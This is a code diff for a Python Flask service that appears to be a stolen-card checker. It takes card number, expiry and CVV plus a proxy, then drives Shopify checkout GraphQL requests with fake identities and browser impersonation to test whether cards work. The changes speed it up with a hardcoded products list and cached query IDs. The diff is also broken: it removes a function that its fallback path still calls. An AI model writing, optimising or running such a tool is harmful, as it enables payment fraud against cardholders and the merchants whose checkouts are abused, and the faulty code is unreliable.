@@ -26,31 +26,34 @@ app = Flask(__name__)
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
 BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
 
-def _load_sites():
-    env_sites = os.environ.get("SITES", "").strip()
-    if env_sites:
-        parts = re.split(r"[\n,]+", env_sites)
-        return [s.strip() for s in parts if s.strip() and s.strip().startswith("http")]
-    here = os.path.dirname(os.path.abspath(__file__))
-    for name in ("site.txt", "sites.txt"):
-        p = os.path.join(here, name)
-        if os.path.exists(p):
-            with open(p) as f:
-                return [l.strip() for l in f if l.strip() and not l.startswith("#") and l.strip().startswith("http")]
-    return []
+# ═══ NEW: Load Hardcoded Products to bypass slow scraping ═══
+_PRODUCTS_LIST = []
+def _load_products():
+    global _PRODUCTS_LIST
+    file_path = os.path.join(os.path.dirname(__file__), "products.txt")
+    if not os.path.exists(file_path):
+        return
+    try:
+        with open(file_path, "r", encoding="utf-8") as f:
+            for line in f:
+                # Parses: ID: 58864569811325 | $1.5 | TITLE | URL
+                m = re.search(r'ID:\s*(\d+)\s*\|\s*\$?([\d.]+)\s*\|.*?\|\s*(https?://[^\s|]+)', line)
+                if m:
+                    _PRODUCTS_LIST.append({
+                        "vid": m.group(1), 
+                        "price": m.group(2), 
+                        "shop": m.group(3).strip().rstrip('/')
+                    })
+        if _PRODUCTS_LIST:
+            print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} hardcoded products from products.txt", flush=True)
+    except Exception as e:
+        print(f"[NODE] Error loading products.txt: {e}", flush=True)
 
-_SITES_CACHE = None
-_SITES_CACHE_TS = 0.0
-_SITES_LOCK = threading.Lock()
+_load_products()
 
-def _get_sites():
-    global _SITES_CACHE, _SITES_CACHE_TS
-    now = time.monotonic()
-    with _SITES_LOCK:
-        if _SITES_CACHE is None or now - _SITES_CACHE_TS > 60:
-            _SITES_CACHE = _load_sites()
-            _SITES_CACHE_TS = now
-    return _SITES_CACHE
+# ═══ NEW: GraphQL Cache to save network requests ═══
+_GRAPHQL_CACHE = {}
+_GRAPHQL_LOCK = threading.Lock()
 
 # ─────────────────────────────────────────────────────────────────────────────
 # ⚡ STATE, COUNTER & DEBUG
@@ -68,8 +71,8 @@ def _dec_busy():
 
 _last_failure = {}
 
-_PRODUCT_CACHE = {}   # { shop_url: (variant_id, price) }
-_BLACKLIST = {}       # { shop_url: expire_timestamp }
+_PRODUCT_CACHE = {}   
+_BLACKLIST = {}       
 _CACHE_LOCK = threading.Lock()
 
 def _fail(reason, **extra):
@@ -295,9 +298,13 @@ def _vault_domain(h):
     return ""
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 GRAPHQL IDS & PRODUCTS
+# 🔑 GRAPHQL IDS (Cached to save time)
 # ─────────────────────────────────────────────────────────────────────────────
 def _graphql_ids(session, shop_url, checkout_html, ua):
+    with _GRAPHQL_LOCK:
+        if shop_url in _GRAPHQL_CACHE:
+            return _GRAPHQL_CACHE[shop_url]
+
     m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
     if not m: return None, None, None
     try:
@@ -305,7 +312,12 @@ def _graphql_ids(session, shop_url, checkout_html, ua):
         p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
         s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
         q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
-        return (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
+        res = (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
+        
+        if res[0] and res[1]:
+            with _GRAPHQL_LOCK:
+                _GRAPHQL_CACHE[shop_url] = res
+        return res
     except Exception:
         return None, None, None
 
@@ -318,7 +330,6 @@ def _cheapest_product(session, shop_url, ua, timeout=8):
             return _PRODUCT_CACHE[shop_url][0], _PRODUCT_CACHE[shop_url][1], [("cache", 200)]
 
     diag = []
-    
     for ep in (f"{shop_url}/products.json?limit=250",
                f"{shop_url}/collections/all/products.json?limit=250"):
         try:
@@ -555,20 +566,48 @@ def _run_check(card_str, proxy_str):
     ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
     yyyy = "20" + yy if len(yy) == 2 else yy
 
-    sites = _get_sites()
-    if not sites:
-        return _fail("NO_SITES", hint="set SITES env var or upload site.txt")
+    # ═══ FIX: Use Hardcoded Products List for Speed ═══
+    global _PRODUCTS_LIST
+    if _PRODUCTS_LIST:
+        prod = random.choice(_PRODUCTS_LIST)
+        shop_url = prod["shop"]
+        vid = prod["vid"]
+        price = prod["price"]
+        diag = [("hardcoded", 200)]
+    else:
+        # Fallback to old dynamic scraping
+        sites = _get_sites()
+        if not sites:
+            return _fail("NO_SITES", hint="set SITES env var or upload site.txt")
 
-    now = time.time()
-    with _CACHE_LOCK:
-        valid_sites = [s for s in sites if _BLACKLIST.get(s, 0) < now]
-    
-    if not valid_sites:
+        now = time.time()
         with _CACHE_LOCK:
-            _BLACKLIST.clear() 
-        valid_sites = sites
+            valid_sites = [s for s in sites if _BLACKLIST.get(s, 0) < now]
+        
+        if not valid_sites:
+            with _CACHE_LOCK:
+                _BLACKLIST.clear() 
+            valid_sites = sites
 
-    random.shuffle(valid_sites)
+        random.shuffle(valid_sites)
+        shop_url = valid_sites[0]
+        vid = price = None
+
+        session = requests.Session(impersonate=random.choice(BROWSER_PROFILES))
+        for attempt_site in valid_sites[:3]:
+            shop_url = attempt_site
+            try:
+                vid, price, diag = _cheapest_product(session, shop_url, random.choice(USER_AGENTS), timeout=min(8, max(3, remain())))
+            except Exception:
+                vid = None
+            if vid:
+                break 
+            
+        if not vid:
+            return _fail("NO_PRODUCTS", shop=shop_url, endpoints=diag)
+
+    if remain() < 20:
+        return _fail("BUDGET_AFTER_PRODUCT", elapsed=f"{BUDGET_SEC-remain():.1f}s")
 
     proxy_url = _parse_proxy(proxy_str)
     ua        = random.choice(USER_AGENTS)
@@ -577,32 +616,15 @@ def _run_check(card_str, proxy_str):
     session = requests.Session(impersonate=imp)
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
-    vid = price = None
-    shop_url = valid_sites[0]
-
     try:
-        for attempt_site in valid_sites[:3]:
-            shop_url = attempt_site
-            try:
-                vid, price, diag = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
-            except Exception as e:
-                vid = None
-            if vid:
-                break 
-        
-        if not vid:
-            return _fail("NO_PRODUCTS", shop=shop_url, endpoints=diag)
-        if remain() < 20:
-            return _fail("BUDGET_AFTER_PRODUCT", elapsed=f"{BUDGET_SEC-remain():.1f}s")
-
         try:
             r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
                             allow_redirects=True, timeout=min(10, max(3, remain())))
         except Exception:
             return _resp("CART_FAILED", price=f"{price} USD")
         
-        # ═══ FIX: Clear cache if cart fails so next attempt gets a new product ═══
         if r.status_code != 200:
+            # Clear cache if cart fails
             with _CACHE_LOCK:
                 _PRODUCT_CACHE.pop(shop_url, None)
             return _resp("CART_FAILED", price=f"{price} USD")
@@ -680,7 +702,6 @@ def _run_check(card_str, proxy_str):
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        # ═══ FIX: Address retry loop for SHIPPING errors ═══
         pm_id = ""
         del_h = ""
         signed = []
@@ -689,7 +710,7 @@ def _run_check(card_str, proxy_str):
         shipping_required = True
         r3_text = ""
 
-        for _ in range(3):
+        for _ in range(2):  # Max 2 address attempts to save time
             try:
                 p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
                 p["variables"]["queueToken"] = queue_token
@@ -713,7 +734,6 @@ def _run_check(card_str, proxy_str):
             except Exception:
                 pass
                 
-            # Generate a new address and retry
             time.sleep(0.1)
             fn, ln, email, addr_raw = _identity()
             addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
@@ -952,19 +972,16 @@ def route_debug():
 
 @app.route("/sites")
 def route_sites():
-    sites = _get_sites()
     return jsonify({
-        "source": "env:SITES" if os.environ.get("SITES") else "file:site.txt",
-        "count":  len(sites),
-        "sites":  sites[:20],
+        "hardcoded_products": len(_PRODUCTS_LIST),
+        "sample": _PRODUCTS_LIST[:3] if _PRODUCTS_LIST else []
     })
 
 @app.route("/test")
 def route_test():
-    sites = _get_sites()
-    if not sites:
-        return jsonify({"error": "no sites configured"})
-    shop_url = sites[0]
+    if not _PRODUCTS_LIST:
+        return jsonify({"error": "products.txt empty or missing"})
+    shop_url = _PRODUCTS_LIST[0]["shop"]
     try:
         sess = requests.Session(impersonate="chrome124")
         t0 = time.time()
@@ -972,33 +989,6 @@ def route_test():
         return jsonify({"shop": shop_url, "status": r.status_code, "time": int((time.time() - t0) * 1000)})
     except Exception as e:
         return jsonify({"shop": shop_url, "error": str(e)[:200]})
-
-@app.route("/validate_sites")
-def route_validate():
-    sites = _get_sites()
-    if not sites: return jsonify({"error": "no sites"})
-    
-    good_sites = []
-    bad_sites = []
-    sess = requests.Session(impersonate="chrome124")
-    
-    for site in sites:
-        try:
-            vid, price, _ = _cheapest_product(sess, site, "Mozilla/5.0", timeout=5)
-            if vid:
-                good_sites.append(site)
-            else:
-                bad_sites.append(site)
-        except Exception:
-            bad_sites.append(site)
-            
-    return jsonify({
-        "total": len(sites),
-        "working_count": len(good_sites),
-        "dead_count": len(bad_sites),
-        "working_sites": good_sites,
-        "dead_sites": bad_sites
-    })
 
 # ─────────────────────────────────────────────────────────────────────────────
 # ▶️ ENTRY
